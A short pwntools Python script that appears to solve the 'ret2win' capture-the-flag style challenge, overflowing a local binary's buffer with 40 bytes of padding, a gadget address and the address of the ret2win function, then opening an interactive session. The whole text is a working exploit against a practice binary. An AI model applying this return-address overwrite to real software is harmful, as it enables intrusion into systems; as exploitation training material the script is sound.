from pwn import *
elf = ELF("ret2win")
io = elf.process()
payload = b""
payload += b"a" * 40
gadget_offset = 0x40053e
payload += p64(gadget_offset)
payload += p64(elf.symbols["ret2win"])
io.sendline(payload)
io.interactive()
